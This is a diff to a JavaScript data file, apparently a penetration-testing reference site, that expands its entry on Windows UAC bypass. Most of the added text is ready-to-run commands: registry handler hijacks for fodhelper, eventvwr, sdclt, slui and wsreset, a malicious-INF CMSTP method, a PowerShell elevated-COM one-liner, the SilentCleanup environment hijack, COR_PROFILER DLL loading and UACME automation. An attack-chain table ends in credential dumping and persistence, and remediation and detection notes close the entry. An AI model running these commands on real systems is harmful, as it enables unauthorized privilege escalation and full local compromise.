@@ -6101,8 +6101,9 @@ var VULNS = [
         quickReference: [
           { label: "Check integrity level", cmd: "whoami /groups | findstr Label   (Medium = not elevated)" },
           { label: "fodhelper (registry hijack)", cmd: "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f\nfodhelper.exe" },
-          { label: "Automated (many techniques)", cmd: "UACME (akagi.exe) -m <method>   ;   metasploit bypassuac_* modules" },
-          { label: "eventvwr / sdclt / computerdefaults", cmd: "similar HKCU registry hijacks against other auto-elevating binaries" }
+          { label: "Elevated COM moniker (no registry write)", cmd: "powershell -c \"[activator]::CreateInstance([type]::GetTypeFromCLSID('3E5FC7F9-9A51-4367-9063-A120244FBEC7','Elevation:Administrator!new:'))\"" },
+          { label: "SilentCleanup task (environment-variable hijack)", cmd: "reg add HKCU\\Environment /v windir /d \"cmd /c start cmd & REM \" /f\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I" },
+          { label: "Automated (70+ methods)", cmd: "UACME (akagi.exe) -m <method>   ;   metasploit bypassuac_* modules" }
         ],
         sections: [
           {
@@ -6110,10 +6111,33 @@ var VULNS = [
             type: "commands",
             commands: [
               { label: "1. Confirm you are admin but only medium integrity", cmd: "whoami /groups | findstr /i \"Label\"\n# 'Mandatory Label\\Medium Mandatory Level' = filtered token, UAC in the way\n# your user must be in the local Administrators group for elevation to be possible" },
-              { label: "2. fodhelper — hijack the ms-settings handler it auto-elevates through", cmd: "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nfodhelper.exe\n# fodhelper auto-elevates, reads the HKCU handler, and launches your command HIGH integrity\nreg delete \"HKCU\\Software\\Classes\\ms-settings\" /f   # clean up" },
-              { label: "3. Other auto-elevating binaries follow the same pattern", cmd: "# eventvwr.exe  -> HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n# sdclt.exe     -> HKCU\\Software\\Classes\\Folder\\shell\\open\\command  / exefile\n# computerdefaults.exe -> ms-settings (same as fodhelper)" },
-              { label: "4. Trusted-directory / DLL-hijack variants (path normalization)", cmd: "# create a 'mock' trusted dir like C:\\Windows \\System32\\ (trailing space) and drop a\n# hijacked DLL an auto-elevating binary loads; the trusted-path check is fooled\n# UACME automates dozens of these (akagi.exe -m <n>)" },
-              { label: "5. Automate the whole thing", cmd: "# UACME implements 70+ methods across Windows versions\nakagi.exe 33 C:\\temp\\payload.exe\n# metasploit: use exploit/windows/local/bypassuac_fodhelper (set SESSION)" }
+              { label: "2. fodhelper / computerdefaults — hijack the ms-settings handler", cmd: "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nfodhelper.exe              # or computerdefaults.exe — both auto-elevate via ms-settings\nreg delete \"HKCU\\Software\\Classes\\ms-settings\" /f   # clean up" },
+              { label: "3. eventvwr / sdclt / slui — same pattern, different handler key", cmd: "# eventvwr.exe  -> HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n# sdclt.exe     -> HKCU\\Software\\Classes\\Folder\\shell\\open\\command   (or exefile)\n# sdclt.exe     -> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe  (sdclt /kickoffelev)\n# slui.exe      -> HKCU\\Software\\Classes\\exefile\\shell\\open\\command\nreg add \"HKCU\\Software\\Classes\\exefile\\shell\\open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f\nslui.exe" },
+              { label: "4. wsreset — hijack the AppX / ms-windows-store handler", cmd: "# wsreset.exe auto-elevates and opens the Store protocol handler the medium user can write:\nreg add \"HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nwsreset.exe" },
+              { label: "5. CMSTP — drive the auto-elevating CMSTPLUA COM via a malicious INF", cmd: "# an INF with a [RunPreSetupCommands] section is run elevated by cmstp without a prompt\ncmstp.exe /au C:\\Windows\\Temp\\uac.inf\n# the INF's RunPreSetupCommands launches your payload at high integrity" },
+              { label: "6. Elevated COM moniker — fileless, no registry hijack", cmd: "# instantiate an auto-elevating COM object through the 'Elevation:Administrator!new:' moniker\n# CMSTPLUA (ICMLuaUtil)  {3E5FC7F9-9A51-4367-9063-A120244FBEC7}\n# IColorDataProxy / IFileOperation are the other classic interfaces\npowershell -c \"$c=[type]::GetTypeFromCLSID('3E5FC7F9-9A51-4367-9063-A120244FBEC7','Elevation:Administrator!new:');$o=[activator]::CreateInstance($c);$o.ShellExec('cmd.exe','/c start cmd.exe','',$null,0)\"" },
+              { label: "7. SilentCleanup — a user-triggerable elevated scheduled task + %windir% hijack", cmd: "# \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup runs with highest privileges and a normal\n# user can start it; it expands %windir% from the environment, which HKCU can override:\nreg add \"HKCU\\Environment\" /v windir /t REG_SZ /d \"cmd /c start cmd.exe & REM \" /f\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\nreg delete \"HKCU\\Environment\" /v windir /f   # clean up" },
+              { label: "8. COR_PROFILER — load a .NET profiler DLL into an auto-elevating .NET process", cmd: "# register an unmanaged profiler DLL in HKCU and point the CLR env vars at it, then\n# launch an auto-elevating .NET binary (mmc.exe eventvwr.msc) which loads it elevated\nreg add \"HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32\" /ve /d \"C:\\Windows\\Temp\\evil.dll\" /f\nreg add \"HKCU\\Environment\" /v COR_ENABLE_PROFILING /d 1 /f\nreg add \"HKCU\\Environment\" /v COR_PROFILER /d \"{CLSID}\" /f\neventvwr.exe" },
+              { label: "9. Trusted-directory / DLL-hijack variants (path normalization)", cmd: "# create a 'mock' trusted dir like C:\\Windows \\System32\\ (trailing space) and drop a\n# hijacked DLL an auto-elevating binary (dccw.exe, winsat.exe, ...) loads from it;\n# the trusted-path check is fooled. UACME automates dozens of these." },
+              { label: "10. Automate the whole thing", cmd: "# UACME implements 70+ methods across Windows versions\nakagi.exe 33 C:\\temp\\payload.exe\n# metasploit: use exploit/windows/local/bypassuac_fodhelper (set SESSION)" }
+            ]
+          },
+          {
+            title: "Methods by Class",
+            type: "table",
+            columns: ["Technique / binary", "What it abuses"],
+            rows: [
+              ["fodhelper.exe / computerdefaults.exe", "HKCU ms-settings\\Shell\\Open\\command handler + empty DelegateExecute"],
+              ["eventvwr.exe", "HKCU mscfile\\shell\\open\\command handler"],
+              ["sdclt.exe", "HKCU Folder\\shell\\open\\command, or App Paths\\control.exe (sdclt /kickoffelev)"],
+              ["slui.exe", "HKCU exefile\\shell\\open\\command handler"],
+              ["wsreset.exe", "HKCU AppX / ms-windows-store protocol handler"],
+              ["CMSTP.exe", "Malicious INF (RunPreSetupCommands) driving the CMSTPLUA auto-elevate COM"],
+              ["Elevated COM moniker", "Auto-elevating COM object (ICMLuaUtil, IColorDataProxy, IFileOperation) via 'Elevation:Administrator!new:' — no registry write"],
+              ["SilentCleanup task", "A user-triggerable, highest-privilege scheduled task + %windir% HKCU environment-variable hijack"],
+              ["COR_PROFILER", "HKCU .NET profiler env vars + an auto-elevating .NET binary loads your DLL"],
+              ["Mock trusted directory", "'C:\\Windows \\System32\\' (trailing space) + DLL hijack fools the trusted-path check"],
+              ["DLL search order (dccw, winsat)", "An auto-elevating binary loads a DLL from a writable / normalised path"]
             ]
           },
           {
@@ -6123,6 +6147,9 @@ var VULNS = [
             rows: [
               ["Auto-elevation", "Some signed MS binaries elevate with no prompt (autoElevate=true in the manifest)"],
               ["HKCU handler hijack", "They read program IDs / handlers from HKCU, which a medium process can write"],
+              ["Elevated COM moniker", "Auto-elevating COM interfaces can be created with an admin token and no prompt — fileless"],
+              ["Environment-variable hijack", "HKCU\\Environment overrides (%windir%) or CLR profiler vars steer what an elevated process runs/loads"],
+              ["Triggerable elevated task", "Scheduled tasks set to run with highest privileges but startable by a normal user"],
               ["Path normalization", "Trusted-directory checks can be fooled with mock dirs (trailing space/dot)"],
               ["DLL search order", "An auto-elevating binary loads a DLL from a writable/normalised path"],
               ["Not a security boundary", "Microsoft does not service UAC bypasses as vulnerabilities"]
@@ -6134,9 +6161,9 @@ var VULNS = [
             columns: ["Step", "Action", "Result"],
             rows: [
               ["1", "Admin user, medium-integrity process", "Filtered token, need elevation"],
-              ["2", "Plant an HKCU handler / hijack DLL", "Attacker-controlled elevation path"],
-              ["3", "Launch the auto-elevating binary", "It runs your command high-integrity"],
-              ["4", "Clean up the registry/DLL artifacts", "Silent full-admin token"],
+              ["2", "Plant a handler/env var, or pick a fileless COM/task method", "Attacker-controlled elevation path"],
+              ["3", "Launch the auto-elevating binary / trigger the task", "It runs your command high-integrity"],
+              ["4", "Clean up the registry/DLL/env artifacts", "Silent full-admin token"],
               ["5", "Dump creds / persist as admin", "Consolidated local compromise"]
             ]
           },
@@ -6145,10 +6172,11 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["UACME (akagi)", "70+ implemented UAC bypass methods"],
-              ["reg.exe / PowerShell", "Plant the HKCU handler for the manual techniques"],
-              ["Metasploit bypassuac_* modules", "Automated bypass from a session"],
-              ["Process Explorer / sigcheck", "Find auto-elevating (autoElevate) binaries"]
+              ["UACME (akagi)", "70+ implemented UAC bypass methods across Windows builds"],
+              ["reg.exe / PowerShell", "Plant HKCU handlers / env vars, or invoke the COM moniker for manual techniques"],
+              ["Metasploit bypassuac_* modules", "Automated bypass from a session (fodhelper, eventvwr, sdclt, COM, ...)"],
+              ["schtasks.exe", "Trigger the SilentCleanup elevated scheduled task"],
+              ["Process Explorer / sigcheck", "Find auto-elevating (autoElevate) binaries to target"]
             ]
           },
           {
@@ -6156,19 +6184,20 @@ var VULNS = [
             type: "references",
             items: [
               { label: "MITRE ATT&CK T1548.002 — Bypass User Account Control", url: "https://attack.mitre.org/techniques/T1548/002/" },
-              { label: "UACME — UAC bypass collection", url: "https://github.com/hfiref0x/UACME" },
-              { label: "Hadess — UAC Evasion", url: "https://hadess.io/" }
+              { label: "UACME — UAC bypass collection (70+ methods)", url: "https://github.com/hfiref0x/UACME" },
+              { label: "MITRE ATT&CK T1574.012 — COR_PROFILER", url: "https://attack.mitre.org/techniques/T1574/012/" },
+              { label: "HackTricks — UAC bypass", url: "https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Set UAC to the highest level (Always Notify) so even auto-elevating binaries prompt.",
-              "Do not let daily-use accounts be local administrators; use a separate admin account and a PAW for admin tasks.",
-              "Monitor HKCU handler keys (ms-settings, mscfile, Folder\\shell\\open\\command) and auto-elevating binaries spawning shells.",
-              "Application allow-listing (WDAC/AppLocker) limits what an elevated child can run.",
-              "Detect: fodhelper/eventvwr/sdclt/computerdefaults launching cmd/powershell, and writes to the known hijack registry paths."
+              "Set UAC to the highest level (Always Notify) so even auto-elevating binaries prompt — and prefer that admins log on with a separate account on a PAW rather than elevating from a daily-use session.",
+              "Do not let daily-use accounts be local administrators; with no admin token to unlock, a UAC bypass has nothing to escalate to.",
+              "Monitor the attacker-writable locations these methods need: HKCU handler keys (ms-settings, mscfile, Folder/exefile\\shell\\open\\command, the Store AppX key), HKCU\\Environment (windir, COR_PROFILER / COR_ENABLE_PROFILING), and App Paths overrides.",
+              "Alert on auto-elevating binaries (fodhelper, computerdefaults, eventvwr, sdclt, slui, wsreset, cmstp) spawning cmd/powershell, on the SilentCleanup task being run interactively by a user, and on elevated COM objects created from a medium-integrity process.",
+              "Application allow-listing (WDAC/AppLocker) limits what an elevated child can run, and WDAC's block rules deny several of the signed binaries these chains rely on."
             ]
           }
         ]
